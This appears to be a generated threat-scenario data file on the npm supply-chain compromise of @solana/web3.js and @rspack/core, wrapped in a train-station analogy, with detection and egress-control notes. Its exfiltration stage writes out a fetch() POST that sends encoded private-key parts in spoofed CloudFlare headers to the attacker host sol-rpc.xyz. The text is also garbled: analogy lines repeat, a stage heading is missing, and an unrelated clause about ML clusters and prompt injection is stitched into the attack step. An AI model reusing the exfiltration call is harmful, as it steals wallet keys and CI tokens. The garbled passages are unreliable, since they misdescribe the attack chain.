scenario.name: Solana Labs, Rspack Advisory & Socket.dev — @solana/web3.js & @rspack/core NPM Maintainer Compromise & Private Key / CI Token Exfiltration
scenario.overview: Picture a grand central train station with an arched iron canopy, hanging station clock, ticket turnstiles, parallel railway tracks, and a sleek express train waiting at the platform. Beneath the central train station canopy, a stowaway slips past the platform ticket barrier using a copied conductor punch card right before boarding time. In this real-world scenario, the intruder approaches the platform ticket barrier disguised as a regular visitor, then quietly copies a trusted access pass from the station conductor's station. The station master’s glowing track-indicator board flashes a route mismatch the instant the express train leaves its scheduled platform line. In this scenario (T1195.002, Solana Labs, Rspack Advisory & Socket.dev - @solana/web3.js & @rspack/core NPM Maintainer Compromise & Private Key / CI Token Exfiltration), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: nPM Maintainer Spearphishing, Token Hijack, then addToQueue Hook Injection Inside, then disguised CloudFlare Header Private Key. Steps #1–#3 walk that chain end-to-end by covering NPM Maintainer Spearphishing, Token Hijack, then addToQueue Hook Injection Inside, then Disguised CloudFlare Header Private Key, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 22 with the documented host and network chain.

stages.subtitle: Initial Access (T1195.002 - Compromise Software Supply Chain)
stages.description: Beneath the central train station canopy, a stowaway slips past the platform ticket barrier using a copied conductor punch card right before boarding time. stages.subtitle: Collection & Credential Access (T1552.004 - Unsecured Credentials: Private Keys)
stages.description: Walking beside the railway tracks, the stowaway flips a track-routing switch lever so the express passenger train is redirected onto an unguarded freight siding. Here in Step 2 inside the train station, the intruder quietly copies a trusted access pass from the station conductor's station without disturbing the eastbound local track. Downstream applications and CI/CD pipelines running npm update or unpinned caret ranges (^1.95.0) pull @solana/web3.js@1.95.6. stages.title: Stage 3: Disguised CloudFlare Header (`CF-Connecting-IP` / `CF-Ray`) Private Key Exfiltration to `sol-rpc.xyz`
stages.subtitle: Exfiltration (T1041 - Exfiltration Over C2 Channel)
stages.description: With the station clock ticking, the express locomotive pulls onto the alternate siding where unauthorized cargo bags are transferred off the rear coach. In this final step inside the train station, the intruder quietly copies a trusted access pass from the station conductor's station until the station master signal board catches the mismatch. To blend into normal RPC telemetry, addToQueue() encodes the stolen 64-byte private key into fake CloudFlare HTTP request headers (CF-Connecting-IP, CF-Worker, CF-Ray) and sends an HTTPS POST request to https://sol-rpc.xyz/api/v1/bro, allowing the attacker to immediately drain affected hot wallets and rotate stolen CI tokens (logged in Sysmon Event 22 with ExfilDomain=https://sol-rpc.xyz/api/v1/bro, SteganographicChannel=Spoofed CloudFlare HTTP headers , CF-Connecting-IP, CF-Ray so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes fetch("https://sol-rpc.xyz/api/v1/bro", { method: "POST", headers: { "CF-Connecting-IP": encodedKeyPart1, "CF-Ray": encodedKeyPart2 } }) (which inspects or executes AI/ML infrastructure operations , fetch, "https://sol-rpc.xyz/api/v1/bro", { method: "POST", headers: { "CF-Connecting-IP": en so that exposes unauthenticated ML cluster job submission, unsafe model checkpoint deserialization, or indirect prompt injection via RAG context retrieval , T1041 during "Disguised CloudFlare Header , CF-Connecting-IP / CF-Ray Private Key Exfiltration to sol-rpc.xyz"). On the diagram, follow Step #3 / Link #3 (#3→ node / ⇠#3 ACK 22) from Node ③ (#3 NPM Registry (@solana/web3.js@1.95.6 & @rspack/core@1.1.7)) to Node ④ (#4 Developer / CI Build Runner (npm install)), monitored by Node ⑥ (#6 Keypair.fromSecretKey & CI Secrets Exfiltrated).

keySpecs.value: Enforce strict egress allowlisting on signing backends and CI runners so `node` processes can only communicate with approved RPC endpoints.

steps.storyAnalogy: With the station clock ticking, the express locomotive pulls onto the alternate siding where unauthorized cargo bags are transferred off the rear coach.
